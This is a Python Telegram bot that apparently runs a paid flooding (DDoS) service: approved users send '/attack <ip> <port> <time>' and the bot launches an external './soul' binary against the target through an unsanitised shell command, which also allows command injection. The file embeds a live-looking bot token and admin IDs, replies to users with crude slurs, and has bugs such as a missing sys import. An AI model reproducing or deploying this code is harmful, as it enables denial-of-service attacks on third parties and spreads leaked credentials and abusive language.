import os
import subprocess
import threading
import json
from datetime import datetime, timedelta
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext

admins = [5670958127, 1355390037, 1162653526, 1424305621, 1842046001]  # Added 1162653526 and 1424305621
approved_users = {}
attack_history = {}
active_attacks = {}

# Load approved users and attack history from JSON files
if os.path.exists("approved_users.json"):
    with open("approved_users.json", "r") as f:
        approved_users = json.load(f)

if os.path.exists("attack_history.json"):
    with open("attack_history.json", "r") as f:
        attack_history = json.load(f)

def save_data():
    with open("approved_users.json", "w") as f:
        json.dump(approved_users, f)
    with open("attack_history.json", "w") as f:
        json.dump(attack_history, f)

def check_approval(user_id):
    if user_id in approved_users:
        expires_on = datetime.strptime(approved_users[user_id]['expires_on'], "%Y-%m-%d %H:%M:%S.%f")
        if datetime.now() > expires_on:
            del approved_users[user_id]  # Remove the user if expired
            save_data()
            return False
        return True
    return False

def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if check_approval(user_id):
        update.message.reply_text("AREE TU FIRSE AA GYA SMJH NA AAYE TO DONO HATHO SE HELP DABA, use /help")
    else:
        update.message.reply_text("YE DEKHO AA GYA 2 KD WALA KD BADHANE")

def help_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if check_approval(user_id):
        update.message.reply_text("Available commands:\n/attack <ip> <port> <time>")
    else:
        update.message.reply_text("YE DEKHO AA GYA 2 KD WALA KD BADHANE")

def approve(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("TU THORA SA BKL HAI YE KAAM BSS @JKS6190 HI KR SKTA HA MESSAGE BHEJ USE")
        return

    try:
        target_id = int(context.args[0])
        # Set the approval duration to 1 day directly
        approved_users[target_id] = {
            "approved_date": str(datetime.now()),
            "expires_on": str(datetime.now() + timedelta(days=1))  # Fixed to 1 day
        }
        save_data()
        update.message.reply_text(f"User {target_id} approved for 1 day.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /approve <user_id>")

def disapprove(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("TU THORA SA BKL HAI KYA")
        return

    try:
        target_id = int(context.args[0])
        if target_id in approved_users:
            del approved_users[target_id]
            save_data()
            update.message.reply_text(f"User {target_id} has been disapproved.")
        else:
            update.message.reply_text("User is not approved.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /disapprove <user_id>")

def list_approved(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("TU THORA SA BEHEN KA LODA H KYA")
        return

    if approved_users:
        message = "Approved Users:\n"
        for uid, data in approved_users.items():
            days_left = (datetime.strptime(data['expires_on'], "%Y-%m-%d %H:%M:%S.%f") - datetime.now()).days
            message += f"User ID: {uid}, Days Left: {days_left}\n"
        update.message.reply_text(message)
    else:
        update.message.reply_text("No approved users.")

def attack(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if not check_approval(user_id):
        update.message.reply_text("HATHI KA LAUDA GHORE PE OR TU GHORE KE LODE PE")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])

        # Notify attack started
        update.message.reply_text(f"STARTED ON\nIP: {ip}\nPORT: {port}\nTIME: {duration}")

        command = f"./soul {ip} {port} {duration} 30 432103802284"
        process = subprocess.Popen(command, shell=True)

        attack_history.setdefault(str(user_id), []).append({"ip": ip, "port": port, "time": duration, "start_time": str(datetime.now())})
        save_data()

        def end_attack():
            process.kill()
            update.message.reply_text(f"Attack over on\nIP: {ip}\nPORT: {port}\nTIME: {duration}")
        
        timer = threading.Timer(duration, end_attack)
        timer.start()
        
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /attack <ip> <port> <time>")

def show_attacks(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("NIKAL LAUDE PEHLI PEHLI FURSAT ME NIKAL")
        return

    message = "Attack History (Last 24 hours):\n"
    now = datetime.now()
    for uid, attacks in attack_history.items():
        attacks_in_24h = [a for a in attacks if (now - datetime.strptime(a['start_time'], "%Y-%m-%d %H:%M:%S.%f")).total_seconds() < 86400]
        message += f"User ID: {uid}, Number of Attacks: {len(attacks_in_24h)}\n"
    
    update.message.reply_text(message)

def restart(update: Update, context: CallbackContext) -> None:
    os.execl(sys.executable, sys.executable, *sys.argv)

def main():
    updater = Updater("7485969308:AAGWPtzNxCtcPdB-VR-qdkztwLgS9NLoqnE", use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("approve", approve))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove))
    dispatcher.add_handler(CommandHandler("list", list_approved))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("show_attack", show_attacks))
    dispatcher.add_handler(CommandHandler("restart", restart))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
	
